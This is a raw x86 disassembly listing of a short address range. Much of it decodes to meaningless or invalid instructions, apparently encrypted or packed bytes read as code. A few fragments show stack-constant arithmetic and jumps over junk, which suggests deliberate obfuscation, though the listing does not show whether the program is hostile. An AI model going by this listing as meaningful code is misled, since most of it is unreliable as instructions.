  413fed:	xor    BYTE PTR [ecx+0x3],ah
  413ff0:	adc    al,0xb0
  413ff2:	inc    ecx
  413ff3:	mov    ah,0xff
  413ff5:	mov    BYTE PTR [edx],cl
  413ff7:	cwde   
  413ff8:	pop    edi
  413ff9:	icebp  
  413ffa:	out    0xdc,al
  413ffc:	scas   al,BYTE PTR es:[edi]
  413ffd:	pop    ebp
  413ffe:	xchg   edi,eax
  413fff:	stos   DWORD PTR es:[edi],eax
  414000:	sbb    BYTE PTR [ebx+0x4f07ec08],bh
  414006:	je     0x414042
  414008:	sahf   
  414009:	setg   BYTE PTR [edi+0x57]
  41400d:	add    ah,BYTE PTR [ebx-0x796c616f]
  414013:	outs   dx,DWORD PTR ds:[si]
  414015:	mov    WORD PTR ds:0xb29de0d5,gs
  41401b:	add    eax,0xe2b3e831
  414020:	in     eax,0x19
  414022:	sbb    ch,BYTE PTR [edi]
  414024:	rcr    cl,cl
  414026:	xchg   ecx,eax
  414027:	push   es
  414028:	(bad)  
  414029:	pop    ebp
  41402a:	adc    ch,bl
  41402c:	dec    ebx
  41402d:	daa    
  41402e:	cmc    
  41402f:	mov    BYTE PTR [edi-0xc73935f],cl
  414035:	push   eax
  414036:	adc    BYTE PTR [ebx+0x188191bb],ch
  41403c:	aas    
  41403d:	mov    al,ds:0xa1668734
  414042:	ret    0x9502
  414045:	sub    BYTE PTR [esi+esi*8],al
  414048:	xchg   ebx,eax
  414049:	dec    esi
  41404a:	sbb    DWORD PTR [esi],ebx
  41404c:	mov    esp,0xca1abf41
  414051:	cmc    
  414052:	add    dl,BYTE PTR [eax]
  414054:	jg     0x414011
  414056:	call   0xd16e7d19
  41405b:	sbb    eax,0x1cc1ffec
  414060:	mov    ds:0xffc7a827,al
  414065:	add    dl,dl
  414067:	or     eax,0x9035dba
  41406c:	outs   dx,BYTE PTR ds:[esi]
  41406d:	in     al,0x35
  41406f:	(bad)
  414072:	int3   
  414073:	shl    BYTE PTR [ebx],cl
  414075:	inc    edi
  414076:	jmp    0x414024
  414078:	fwait
  414079:	xchg   edi,eax
  41407a:	xchg   ecx,eax
  41407b:	outs   dx,DWORD PTR ds:[esi]
  41407c:	cmp    esi,DWORD PTR [eax+0x26eb168c]
  414082:	sub    al,0x66
  414084:	popf   
  414085:	and    al,0x57
  414087:	lods   al,BYTE PTR ds:[esi]
  414088:	jns    0x414076
  41408a:	mov    ah,0x98
  41408c:	mov    ah,0x1c
  41408e:	pop    edi
  41408f:	test   al,0x51
  414091:	ss retf 0x5995
  414095:	mov    BYTE PTR [esp+ebx*8],ch
  414098:	(bad)  
  414099:	cmc    
  41409a:	test   al,0x6e
  41409c:	js     0x414105
  41409e:	shl    BYTE PTR [edi+esi*1+0x2dd99476],0xf8
  4140a6:	mov    esi,0x96df8d3d
  4140ab:	pop    ds
  4140ac:	rcr    esp,0xe1
  4140af:	fwait
  4140b0:	ins    BYTE PTR es:[edi],dx
  4140b1:	pop    ebx
  4140b2:	push   esi
  4140b3:	inc    esi
  4140b4:	mov    ebx,DWORD PTR [ebx+ebx*8-0x1e77694d]
  4140bb:	in     eax,0xe6
  4140bd:	xchg   edi,eax
  4140be:	fidivr WORD PTR [edx]
  4140c0:	xlat   BYTE PTR ds:[ebx]
  4140c1:	fbstp  TBYTE PTR [edx]
  4140c3:	mov    esi,0xc4758957
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x422031
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [esi+ebx*2+0x1c]
  414159:	aaa    
  41415a:	push   0x1a
  41415c:	sub    al,0x18
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    BYTE PTR [esi+0x4f],ah
  414165:	xchg   esi,eax
  414166:	es in  al,dx
  414168:	aas    
  414169:	pop    ecx
  41416a:	mov    edx,0x4ca2bab2
  41416f:	push   ebx
  414170:	push   eax
  414171:	shl    DWORD PTR [esp+ecx*4+0x5b],0xf0
  414176:	stc    
  414177:	sub    ah,dh
  414179:	mov    cl,0x41
  41417b:	xlat   BYTE PTR ds:[ebx]
  41417c:	xchg   ebx,eax
  41417d:	dec    eax
  41417e:	imul   edx,DWORD PTR [eax],0xc3c0ecc3
  414184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414185:	push   edx
  414186:	inc    esi
  414187:	fild   QWORD PTR [ebp+ebx*1+0x779de502]
  41418e:	scas   al,BYTE PTR es:[edi]
  41418f:	cmp    al,0xf0
  414191:	add    bl,cl
  414193:	inc    edx
  414194:	fidiv  DWORD PTR [ebx-0x353930eb]
  41419a:	or     bh,BYTE PTR [edi+ebx*2]
  41419d:	in     eax,dx
  41419e:	mov    bh,0x71
  4141a0:	sub    ch,ch
  4141a2:	mov    BYTE PTR [ecx+ebx*2+0x35391894],bl
  4141a9:	out    dx,eax
  4141aa:	xor    ah,BYTE PTR [edi-0x39]
  4141ad:	shl    DWORD PTR [ebx+0x5275fd39],0x7d
  4141b4:	cld    
  4141b5:	xor    DWORD PTR [esi],ebp
  4141b7:	inc    ebp
  4141b8:	js     0x414221
  4141ba:	pop    edi
  4141bb:	sti    
  4141bc:	sbb    DWORD PTR [esi-0x59],0xffffffa0
  4141c0:	dec    ebp
  4141c1:	push   ecx
  4141c2:	xor    dl,bl
  4141c4:	repnz (bad)
  4141c7:	mov    ebx,0xe1642a87
  4141cc:	mov    dl,0x89
  4141ce:	lahf   
  4141cf:	ret    0x155
  4141d2:	outs   dx,DWORD PTR ds:[esi]
  4141d3:	pop    esp
  4141d4:	cs inc ebp
  4141d6:	jp     0x414204
  4141d8:	and    dl,BYTE PTR [edx-0x4b439f15]
  4141de:	mov    al,ds:0x1346c446
  4141e3:	retf   
  4141e4:	or     edx,DWORD PTR [ebx-0x27]
  4141e7:	mov    cs,WORD PTR [edx]
  4141e9:	clc    
  4141ea:	mov    cl,0x3b
  4141ec:	pushf  
  4141ed:	xor    al,0xbb
  4141ef:	or     eax,0x96f99762
  4141f4:	sbb    dl,BYTE PTR [esp+eiz*2-0x3]
  4141f8:	jg     0x414207
  4141fa:	inc    ecx
  4141fb:	mov    edi,0x2395f58e
  414200:	adc    ebx,DWORD PTR [ecx-0x43]
  414203:	mov    eax,0x51f316b6
  414208:	fnstenv [esi+0x12]
  41420b:	mov    ds:0x2de1f079,al
  414210:	mov    esp,0x52f24c87
  414215:	sub    al,BYTE PTR es:[esi-0x1a9bfea5]
  41421c:	test   BYTE PTR [edx-0x8def5a],cl
  414222:	inc    ecx
  414223:	xor    ecx,ecx
  414225:	ins    BYTE PTR es:[edi],dx
  414226:	enter  0x8169,0x5e
  41422a:	mov    fs,WORD PTR [esi+0x0]
  41422d:	fidivr DWORD PTR [esi+0x4b]
  414230:	inc    esi
  414231:	mov    edx,0x515a59ec
  414236:	mov    ah,BYTE PTR [edx]
  414238:	xchg   ebp,eax
  414239:	or     edi,DWORD PTR [esi+0x70]
  41423c:	fdiv   DWORD PTR [edx]
  41423e:	out    dx,eax
  41423f:	sbb    eax,0x50baa24c
  414244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414245:	fst    DWORD PTR [esi-0xe77fc84]
  41424b:	or     ah,BYTE PTR [edi]
  41424d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41424e:	inc    esi
  41424f:	cwde   
  414250:	add    eax,0x67adb769
  414255:	cmp    DWORD PTR [ebp-0x68],edi
  414258:	out    0x5,al
  41425a:	push   edi
  41425b:	inc    ebx
  41425c:	adc    al,BYTE PTR [eax+0x7e89fc2f]
  414262:	push   ecx
  414263:	xchg   esp,eax
  414264:	xor    DWORD PTR [edx-0x54],esp
  414267:	push   ebp
  414268:	daa    
  414269:	fdiv   DWORD PTR [edi+0x1893efd8]
  41426f:	xchg   esi,eax
  414270:	ja     0x4142cb
  414272:	mov    ebx,0xc9aa3fda
  414277:	add    ebx,edx
  414279:	pop    ecx
  41427a:	repnz push ebx
  41427c:	fistp  DWORD PTR [eax+eiz*8-0x3a]
  414280:	push   esi
  414281:	sub    eax,0x9caa89d3
  414286:	cmp    dl,ch
  414288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414289:	retf   0x3a77
  41428c:	mov    gs,WORD PTR [esi-0x79]
  41428f:	or     dl,BYTE PTR [eax]
  414291:	xchg   esi,eax
  414292:	jb     0x41427c
  414294:	ret    0xd395
  414297:	pop    esi
  414298:	cld    
  414299:	mov    edi,0xdc3b579e
  41429e:	stc    
  41429f:	arpl   WORD PTR [edx],dx
  4142a1:	pop    ebx
  4142a2:	or     al,0xf7
  4142a4:	xchg   edx,eax
  4142a5:	lahf   
  4142a6:	mov    cl,0x26
  4142a8:	scas   eax,DWORD PTR es:[edi]
  4142a9:	inc    esp
  4142aa:	or     al,BYTE PTR [esi+0x35]
  4142ad:	adc    BYTE PTR [ecx+0x21],0x9
  4142b1:	repnz xchg ecx,eax
  4142b3:	fs mov esi,0x89c3fc5b
  4142b9:	jl     0x414254
  4142bb:	lahf   
  4142bc:	and    eax,0x325be077
  4142c1:	dec    edi
  4142c2:	neg    DWORD PTR [edx+ebp*4-0x5bd4fc3]
  4142c9:	sub    BYTE PTR [edi],bl
  4142cb:	ins    BYTE PTR es:[edi],dx
  4142cc:	cdq    
  4142cd:	dec    esp
  4142ce:	mov    dh,BYTE PTR [eax-0x36996464]
  4142d4:	add    eax,0xd0faa17f
  4142d9:	xor    DWORD PTR [ebx+0xe55241d],edi
  4142df:	sub    edx,DWORD PTR [ebx]
  4142e1:	add    DWORD PTR [eax],edi
  4142e3:	xchg   edi,eax
  4142e4:	mov    ebx,0xe5953cd2
  4142e9:	ss push edx
  4142eb:	loopne 0x4142c1
  4142ed:	xor    BYTE PTR [esi-0x54],ch
  4142f0:	mov    edi,0xbaf3e95b
  4142f5:	lods   eax,DWORD PTR ds:[esi]
  4142f6:	in     eax,0x71
  4142f8:	dec    edx
  4142f9:	int3   
  4142fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142fb:	push   cs
  4142fc:	push   edx
  4142fd:	stos   DWORD PTR es:[edi],eax
  4142fe:	fcmovne st,st(7)
  414300:	nop
  414301:	push   esi
  414302:	dec    edi
  414303:	and    al,BYTE PTR [eax+0x6d]
  414306:	cld    
  414307:	sbb    al,0xc5
  414309:	xchg   ch,bh
  41430b:	sbb    DWORD PTR [eax+0x5a],0xffffffd7
  41430f:	vcmpsd xmm2,xmm1,QWORD PTR [edi-0x7f1f3ea5],0xb0
  414318:	jns    0x41432f
  41431a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41431c:	sub    al,0x2b
  41431e:	test   al,0xf3
  414320:	in     al,dx
  414321:	xchg   BYTE PTR [edi+0x3f],bh
  414324:	xchg   BYTE PTR [esi],bh
  414326:	cwde   
  414327:	loop   0x4142fa
  414329:	fwait
  41432a:	ret    0x92cc
  41432d:	shl    bh,cl
  41432f:	inc    edx
  414330:	inc    eax
  414331:	fidivr DWORD PTR [ecx]
  414333:	pop    es
  414334:	cmp    al,0xf5
  414336:	ficom  DWORD PTR ds:0xf358abaa
  41433c:	scas   eax,DWORD PTR es:[edi]
  41433d:	pop    ebp
  41433e:	inc    edi
  41433f:	scas   eax,DWORD PTR es:[edi]
  414340:	call   0x86de:0x2cad7b8d
  414347:	out    dx,al
  414348:	cmp    eax,0x724ea54f
  41434d:	xchg   edx,eax
  41434e:	push   ebx
  41434f:	fucomip st,st(6)
  414351:	push   ds
  414352:	stos   BYTE PTR es:[edi],al
  414353:	xor    al,al
  414355:	dec    eax
  414356:	retf   
  414357:	sub    BYTE PTR [edi],cl
  414359:	dec    esp
  41435a:	push   ds
  41435b:	lea    ecx,[ebx]
  41435d:	mov    WORD PTR [ebx+esi*2],ss
  414360:	in     eax,0x9f
  414362:	jmp    0x1322e2e0
  414367:	in     al,dx
  414368:	ins    BYTE PTR es:[edi],dx
  414369:	ja     0x4143ae
  41436b:	sub    DWORD PTR [eax],edx
  41436d:	cmc    
  41436e:	(bad)  [esi+0x77]
  414371:	push   ecx
  414372:	or     al,0x49
  414374:	xchg   ebp,eax
  414375:	add    DWORD PTR [edi+0x18acfce6],ebp
  41437b:	and    DWORD PTR [ebp-0x194a2218],ecx
  414381:	xchg   ebx,eax
  414382:	xchg   BYTE PTR [eax+0x6e],ah
  414385:	dec    eax
  414386:	shl    DWORD PTR [edx+0x3],cl
  414389:	jecxz  0x4143a6
  41438b:	ins    BYTE PTR es:[edi],dx
  41438c:	sbb    edx,DWORD PTR [ecx]
  41438e:	sbb    eax,0xe13cb3c2
  414393:	push   esp
  414394:	or     esi,DWORD PTR [esi+0x7ef6267b]
  41439a:	test   BYTE PTR [ebx+0x2],dh
  41439d:	and    eax,0x206d8774
  4143a2:	out    0x9,al
  4143a4:	daa    
  4143a5:	inc    ebx
  4143a6:	or     BYTE PTR [edi],bh
  4143a8:	mov    bh,0x1
  4143aa:	in     al,0x33
  4143ac:	inc    esi
  4143ad:	push   ebp
  4143ae:	sbb    ebx,DWORD PTR [ecx-0x783478e9]
  4143b4:	hlt    
  4143b5:	or     DWORD PTR [edi-0x544081b3],ebp
  4143bb:	gs inc ebx
  4143bd:	jnp    0x414366
  4143bf:	leave  
  4143c0:	push   edi
  4143c1:	xchg   ecx,eax
  4143c2:	retf   
  4143c3:	xchg   ebp,eax
  4143c4:	shr    ebx,0x19
  4143c7:	xchg   edi,eax
  4143c8:	mov    BYTE PTR [esi],ah
  4143ca:	sbb    al,cl
  4143cc:	mov    ebx,0x683d0c60
  4143d1:	add    esp,ebp
  4143d3:	icebp  
  4143d4:	xchg   ebp,eax
  4143d5:	mov    esp,DWORD PTR [eax]
  4143d7:	enter  0xa485,0x3e
  4143db:	sbb    edx,DWORD PTR [ebx]
  4143dd:	das    
  4143de:	xor    eax,0xd017dc4b
  4143e3:	gs push edi
  4143e5:	adc    ecx,DWORD PTR [esi-0x35]
  4143e8:	or     ah,BYTE PTR [ebx+0x1]
  4143eb:	cmp    BYTE PTR [ebx-0x61],al
  4143ee:	mov    ch,0x45
  4143f0:	add    bh,bl
  4143f2:	ror    dl,cl
  4143f4:	add    bl,BYTE PTR [ebx+0x38dd6a67]
  4143fa:	inc    ebp
  4143fb:	imul   edx,edx,0x15
  4143fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143ff:	ss and BYTE PTR fs:[ecx+eax*4+0x3d],0xf7
  414406:	inc    edx
  414407:	xor    eax,eax
  414409:	syscall 
  41440b:	shr    BYTE PTR [ebx+esi*4-0x1f8b6dcf],1
  414412:	daa    
  414413:	pop    ss
  414414:	ret    0x3992
  414417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414418:	sti    
  414419:	ror    DWORD PTR [eax+0x30],1
  41441c:	mov    WORD PTR [edi+0x6f],ds
  41441f:	psubb  mm1,QWORD PTR [eax-0x48]
  414423:	push   ss
  414424:	scas   eax,DWORD PTR es:[edi]
  414425:	mov    ch,0x1f
  414427:	int    0x65
  414429:	xor    eax,eax
  41442b:	pop    ds
  41442c:	out    dx,eax
  41442d:	aas    
  41442e:	or     bh,BYTE PTR [edi+0x7d]
  414431:	arpl   WORD PTR fs:[esi+0x6dd1235b],si
  414438:	sbb    eax,esi
  41443a:	xor    DWORD PTR [edi],ebp
  41443c:	not    ch
  41443e:	stos   DWORD PTR es:[edi],eax
  41443f:	mov    WORD PTR [ecx+edx*8+0x2f],es
  414443:	add    ebx,DWORD PTR [ecx-0x7a]
  414446:	ror    DWORD PTR ds:[edx+0x6d],cl
  41444a:	out    dx,al
  41444b:	jmp    esi
  41444d:	and    DWORD PTR [ebx],edx
  41444f:	jge    0x414499
  414451:	test   DWORD PTR [ecx+0x16],ecx
  414454:	test   al,0xc1
  414456:	test   eax,0xe17f164a
  41445b:	in     eax,dx
  41445c:	jbe    0x414437
  41445e:	clc    
  41445f:	stos   DWORD PTR es:[edi],eax
  414460:	lods   eax,DWORD PTR ds:[esi]
  414461:	and    eax,0xbdc0dffb
  414466:	aam    0x20
  414468:	aad    0xa9
  41446a:	push   ss
  41446b:	sbb    dl,al
  41446d:	sbb    edi,DWORD PTR [edx*1-0x22fc84d5]
  414474:	mov    al,ds:0x4972169e
  414479:	or     al,0xd1
  41447b:	ficom  DWORD PTR [edi+0x58]
  41447e:	or     BYTE PTR [esi],0xfe
  414481:	sbb    bl,0x77
  414484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414485:	in     eax,dx
  414486:	xor    DWORD PTR [ebx+0x54],0x68
  41448a:	fisub  WORD PTR [edx+0x3e]
  41448d:	jmp    DWORD PTR [eax-0x2abd98d5]
  414493:	sbb    al,0x59
  414495:	add    BYTE PTR [esi-0x22157f2d],ah
  41449b:	shr    BYTE PTR [eax+0x33],1
  41449e:	lds    ebx,FWORD PTR [esi-0x3b]
  4144a1:	mov    cr6,ecx
  4144a4:	xchg   BYTE PTR [ecx-0x3219fe07],cl
  4144aa:	push   ss
  4144ab:	or     bh,BYTE PTR [eax-0x439c4c09]
  4144b1:	adc    cl,bl
  4144b3:	dec    ebx
  4144b4:	arpl   WORD PTR [esi+0x19],si
  4144b7:	mov    DWORD PTR [ebp+0x1a51fdf7],esp
  4144bd:	aad    0x51
  4144bf:	repz or BYTE PTR [ebx+0x35],dh
  4144c3:	ins    BYTE PTR es:[edi],dx
  4144c4:	jns    0x414482
  4144c6:	aad    0xcf
  4144c8:	add    eax,0xd4a0f3a0
  4144cd:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144cf:	mov    dl,bl
  4144d1:	push   eax
  4144d2:	aam    0x6d
  4144d4:	popf   
  4144d5:	pop    es
  4144d6:	scas   al,BYTE PTR es:[edi]
  4144d7:	es mov esp,0x98be397b
  4144dd:	dec    ebp
  4144de:	cld    
  4144df:	not    edx
  4144e1:	in     al,0xd7
  4144e3:	call   0xe10a22d
  4144e8:	sbb    al,0x65
  4144ea:	xchg   ebx,eax
  4144eb:	adc    eax,0x8e8fdbbb
  4144f0:	stos   BYTE PTR es:[edi],al
  4144f1:	mov    ebx,0x340e21e8
  4144f6:	pop    esp
  4144f7:	xchg   esi,eax
  4144f8:	jnp    0x414551
  4144fa:	(bad)  
  4144fc:	sbb    ebx,DWORD PTR [ebx+eax*4+0x75]
  414500:	xchg   esp,eax
  414501:	mov    bl,BYTE PTR [eax]
  414503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414504:	sbb    dl,BYTE PTR [edx+0x724ca5ea]
  41450a:	mov    dl,0xc7
  41450c:	inc    ebp
  41450d:	clc    
  41450e:	add    al,0x32
  414510:	add    BYTE PTR [eax],al
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0x577c:0x73623c4c
  414595:	push   eax
  414596:	cmp    edi,DWORD PTR [esi+0x181824d2]
  41459c:	rcl    BYTE PTR [edx],1
  41459e:	sbb    BYTE PTR [eax],bl
  4145a0:	leave  
  4145a1:	cli    
  4145a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145a3:	div    BYTE PTR [eax+0x4f99c5c9]
  4145a9:	arpl   WORD PTR [ebp+ebp*8-0x148fadb],si
  4145b0:	jne    0x41453b
  4145b2:	sbb    al,0xf0
  4145b4:	jl     0x4145a3
  4145b6:	out    dx,eax
  4145b7:	sbb    DWORD PTR [ebp+0x7ed6cc3f],eax
  4145bd:	mov    BYTE PTR [ebx],bh
  4145bf:	jle    0x41459d
  4145c1:	enter  0xe70d,0x19
  4145c5:	shr    BYTE PTR [ecx+0x41017aad],0x63
  4145cc:	pop    ecx
  4145cd:	(bad)  
  4145ce:	jmp    0xacf44ab2
  4145d3:	mov    ebp,0x4cf737fb
  4145d8:	ins    BYTE PTR es:[edi],dx
  4145d9:	out    0x13,eax
  4145db:	xchg   ebp,eax
  4145dc:	sbb    al,0x14
  4145de:	call   0xb0b3c0f4
  4145e3:	xchg   ebx,eax
  4145e4:	rol    BYTE PTR [ecx+ebx*8+0x4bc36473],1
  4145eb:	mov    edi,0xa4d6c672
  4145f0:	fwait
  4145f1:	xchg   ecx,eax
  4145f2:	push   edx
  4145f3:	test   edi,0xdc776785
  4145f9:	loope  0x4145e2
  4145fb:	sub    dh,ah
  4145fd:	xor    esp,DWORD PTR [ecx]
  4145ff:	cmp    DWORD PTR [ecx],0x3e
  414602:	xlat   BYTE PTR ds:[ebx]
  414603:	pushf  
  414604:	rcl    DWORD PTR [ebp+0x6643c5f6],1
  41460a:	add    esi,DWORD PTR [edx]
  41460c:	and    BYTE PTR [edx],cl
  41460e:	mov    cl,0xe
  414610:	sar    DWORD PTR [eiz*8+0x2048effd],0xf9
  414618:	and    al,0x98
  41461a:	jae    0x4145f6
  41461c:	or     ah,0x6f
  41461f:	sub    BYTE PTR [esi+0x40c4bbfe],0x26
  414626:	shl    DWORD PTR [ebx-0x2b],1
  414629:	add    ecx,esi
  41462b:	imul   eax,esi,0xc20b9e9
  414631:	mov    ah,0x2c
  414633:	push   ebx
  414634:	pop    edi
  414635:	and    ecx,ebx
  414637:	jnp    0x4145e5
  414639:	pop    eax
  41463a:	je     0x4145ea
  41463c:	adc    ebx,esp
  41463e:	inc    ebx
  41463f:	aam    0x68
  414641:	xchg   ebx,eax
  414642:	push   ss
  414643:	out    dx,eax
  414644:	aad    0xd5
  414646:	mov    dh,0xff
  414648:	addr16 pusha 
  41464a:	cmp    al,al
  41464c:	(bad)  
  41464d:	jb     0x414657
  41464f:	mov    eax,0x3ed08a1e
  414654:	cld    
  414655:	(bad)  
  414656:	mov    edi,0xa87a33dc
  41465b:	pop    ebp
  41465c:	rcr    BYTE PTR [ebx+esi*2+0x45701d84],0x32
  414664:	stos   DWORD PTR es:[edi],eax
  414665:	ins    DWORD PTR es:[edi],dx
  414666:	mov    ?,esi
  414668:	push   cs
  414669:	push   es
  41466a:	fxch   st(7)
  41466c:	repnz dec ebx
  41466e:	fs (bad) 
  414670:	push   0xfffffff0
  414672:	pmulhuw mm4,QWORD PTR [ecx-0x3b]
  414676:	cmp    esp,DWORD PTR [ebp+ebx*2-0x36]
  41467a:	scas   al,BYTE PTR es:[edi]
  41467b:	retf   
  41467c:	push   0x4f
  41467e:	inc    edi
  41467f:	inc    esi
  414680:	pop    ds
  414681:	aas    
  414682:	mul    esp
  414684:	das    
  414685:	xor    ecx,esi
  414687:	xor    al,0xb
  414689:	sub    dl,bl
  41468b:	xor    DWORD PTR [esi-0x4a],edi
  41468e:	xor    al,0xf
  414690:	sub    ebp,0xffffff86
  414693:	xor    BYTE PTR cs:0xc829226d,al
  41469a:	ret    
  41469b:	stc    
  41469c:	pop    es
  41469d:	pusha  
  41469e:	icebp  
  41469f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a0:	jl     0x4146c0
  4146a2:	or     dl,cl
  4146a4:	(bad)  
  4146a5:	jns    0x41465d
  4146a7:	in     eax,dx
  4146a8:	inc    ebp
  4146a9:	repz scas al,BYTE PTR es:[edi]
  4146ab:	add    esi,edi
  4146ad:	mov    al,ds:0x8d7b0c7
  4146b2:	mov    DWORD PTR ds:0xfb44d191,edx
  4146b8:	or     eax,0x3547dc53
  4146bd:	pop    es
  4146be:	int3   
  4146bf:	retf   
  4146c0:	and    DWORD PTR [edx-0x1d172d8e],ebp
  4146c6:	inc    ebx
  4146c7:	pusha  
  4146c8:	jne    0x4146b0
  4146ca:	lods   al,BYTE PTR ds:[esi]
  4146cb:	xor    ebp,DWORD PTR [ebp+edi*8-0x75]
  4146cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146d1:	sub    al,BYTE PTR [edx]
  4146d3:	jbe    0x414729
  4146d5:	pushf  
  4146d6:	jmp    0x41468a
  4146d8:	push   edi
  4146d9:	dec    eax
  4146da:	loop   0x4146fc
  4146dc:	outs   dx,BYTE PTR ds:[esi]
  4146dd:	and    DWORD PTR [ebx+0x4b],eax
  4146e0:	jnp    0x414662
  4146e2:	sar    edx,cl
  4146e4:	aam    0x28
  4146e6:	stos   DWORD PTR es:[edi],eax
  4146e7:	pushf  
  4146e8:	and    eax,0x62fe6432
  4146ed:	xchg   ebp,eax
  4146ee:	lds    esi,FWORD PTR [ebx-0x24a0f65f]
  4146f4:	mov    esp,0x2a2c10f3
  4146f9:	or     al,0x61
  4146fb:	sub    DWORD PTR [ebx-0x3f735cc5],edi
  414701:	ffree  st(7)
  414703:	jnp    0x4146bf
  414705:	inc    esp
  414706:	xor    BYTE PTR [ebp-0x1114a00b],ah
  41470c:	or     esp,DWORD PTR [ecx+0x6e]
  41470f:	jo     0x4146b1
  414711:	inc    edx
  414712:	xchg   edx,edi
  414714:	push   ecx
  414715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414716:	dec    edx
  414717:	clc    
  414718:	sbb    al,0xf3
  41471a:	loope  0x414758
  41471c:	das    
  41471d:	outs   dx,DWORD PTR ds:[esi]
  41471e:	outs   dx,BYTE PTR ds:[esi]
  41471f:	or     DWORD PTR [ebp+0x76611894],ecx
  414725:	and    esi,DWORD PTR [eax-0x13]
  414728:	mov    esp,0xf1fa9840
  41472d:	mov    cl,0xd4
  41472f:	stos   DWORD PTR es:[edi],eax
  414730:	shr    BYTE PTR [eax+0x4e],1
  414733:	sub    BYTE PTR [eax-0x67502d1f],cl
  414739:	pop    ebp
  41473a:	outs   dx,BYTE PTR ds:[esi]
  41473b:	inc    edx
  41473c:	and    eax,0xd2c75a9
  414741:	mov    esp,0xe1c366df
  414746:	and    esi,0xc3ac0d3c
  41474c:	(bad)  
  41474d:	mov    es,WORD PTR [eax]
  41474f:	jmp    0xbe13b20a
  414754:	push   esi
  414755:	mov    eax,0xf75eed03
  41475a:	xor    edi,DWORD PTR [edx-0x2a]
  41475d:	repz cmp eax,0x14bfd37c
  414763:	dec    ebx
  414764:	test   eax,0xb7b7f5be
  414769:	ret    0xef54
  41476c:	adc    eax,0xe21f31bc
  414771:	(bad)  
  414772:	cli    
  414773:	and    DWORD PTR [ecx],0x5e
  414776:	and    DWORD PTR [eax+ebp*1],edi
  414779:	adc    DWORD PTR [edx-0x5c],edx
  41477c:	xchg   ebp,eax
  41477d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41477e:	pop    esi
  41477f:	xchg   dx,ax
  414781:	(bad)  
  414782:	data16 scas al,BYTE PTR es:[edi]
  414784:	rcl    BYTE PTR [edx],0x83
  414787:	inc    edi
  414788:	cwde   
  414789:	ret    0x5a96
  41478c:	add    dl,BYTE PTR [ebx+0x6]
  41478f:	daa    
  414790:	sbb    DWORD PTR [edi+ecx*2-0x5ce52584],ecx
  414797:	cwde   
